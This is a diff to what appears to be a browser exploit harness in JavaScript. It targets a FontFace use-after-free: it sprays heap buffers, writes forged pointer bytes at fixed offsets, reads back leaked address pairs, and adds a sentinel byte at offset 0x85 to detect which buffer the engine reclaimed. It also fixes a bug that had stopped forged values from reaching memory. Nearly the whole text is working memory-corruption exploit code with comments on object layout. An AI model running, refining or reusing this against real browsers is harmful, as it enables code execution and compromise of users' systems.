@@ -66,6 +66,20 @@ try{
   if(sx.status===200){
     var st=JSON.parse(sx.responseText);
     if(st.died){diedSince=1;deadArm=st.deadArm;}
+    // Operator rewind: `GET /?p686reset=1&arm=N` makes the next load restart
+    // the series at arm N, so a version whose forge never landed can be
+    // re-measured without touching console storage by hand. One-shot.
+    if(typeof st.armFrom==='number'){
+      arm=st.armFrom;
+      try{
+        localStorage.setItem('p686arm',String(arm));
+        localStorage.removeItem('p686phase');
+        localStorage.removeItem('p686T');
+        localStorage.removeItem('p686I');
+      }catch(e){}
+      try{var xr=new XMLHttpRequest();xr.open('GET','/p686reset=1&arm=clear',false);xr.send();}catch(e){}
+      emit('STATE','operator rewind to arm '+arm);flush();
+    }
   }
 }catch(e){}
 // auto-cycle like p685: root-only console, localStorage carries the index
@@ -75,7 +89,7 @@ try{
     if(!isNaN(stored))arm=stored;
   }catch(e){}
 })();
-emit('START','v7 arm='+arm+' load='+loadNo+'/'+CENSUS_CAP+' died='+(diedSince?'arm'+deadArm:'no'));flush();
+emit('START','v8 arm='+arm+' load='+loadNo+'/'+CENSUS_CAP+' died='+(diedSince?'arm'+deadArm:'no'));flush();
 
 var priorT='',priorI='';
 // if the previous load died, its T/impl are addresses of the dead process
@@ -202,13 +216,22 @@ Object.defineProperty(FontFace.prototype,'then',{
       // carries its forge bytes at 0x58/0x68 and the prime's walk then
       // consumes OUR leftovers (the ~50% prime deaths of the v5 run).
       for(var c=0;c<192;c++)v[c]=0;
+      // Reclaim sentinel: the engine's initializeWrapper() clears
+      // m_mayBePurged (+0x85) on the chunk it actually adopts (p581/p588d),
+      // so 0xAA here is the only honest reclaim proof. A nonzero-byte count
+      // cannot serve as one: our own forge prefill is nonzero by construction.
+      v[0x85]=0xAA;
       if(primeMode && priorT.length===16 && priorI.length===16){
         for(var b=0;b<8;b++){
           v[0x58+b]=parseInt(priorT.substr(16-2*(b+1),2),16);
           v[0x68+b]=parseInt(priorI.substr(16-2*(b+1),2),16);
         }
-      }else if(primeMode){
-        // v5: forge plan cells written little-endian (LSB first)
+      }else{
+        // Arm mode (a prime without a leaked pair leaves FORGE_CELLS empty, so
+        // this is a no-op there). v5.1 guarded this with `else if(primeMode)`,
+        // a branch that can never be true at this point: every arm sprayed
+        // zeros and no forge value ever reached memory. Arms 9 and 10 of the
+        // 2026-11-08 run are nulls for this reason.
         for(var ci=0;ci<FORGE_CELLS.length;ci++){
           var fc=FORGE_CELLS[ci];
           for(var b=0;b<8;b++)v[fc.off+b]=parseInt(fc.val.substr(16-2*(b+1),2),16);
@@ -233,16 +256,14 @@ document.fonts.load('1em f0, s0','AB').then(function(){
 },function(){emit('REJECTED','promise rejected');});
 
 setTimeout(function(){
-  var hit=-1,nzBest=0;
-  for(var i=0;i<map.length;i++){
-    var v=map[i].view,n=0;
-    for(var j=0;j<192;j++)if(v[j]!==0)n++;
-    if(n>nzBest){nzBest=n;hit=i;}
-  }
-  if(hit<0)emit('SCAN','clean-no-reclaim');
+  // Reclaim oracle: +0x85 was seeded 0xAA in every spray buffer, and only the
+  // chunk the engine adopted has it cleared to 0x00.
+  var hit=-1;
+  for(var i=0;i<map.length;i++){if(map[i].view[0x85]!==0xAA){hit=i;break;}}
+  if(hit<0)emit('SCAN','no-reclaim 85=0xAA in all '+map.length);
   else{
     var v=map[hit].view;
-    emit('SCAN','buf='+hit+' nz='+nzBest);
+    emit('SCAN','reclaimed buf='+hit+' 85=0x'+hex8(v[0x85]));
     emit('PAIR','58='+qw(v,0x58)+' 68='+qw(v,0x68));
     var cells='';
     for(var o=0x18;o<=0x68;o+=8)cells+=o.toString(16)+':'+qw(v,o)+' ';
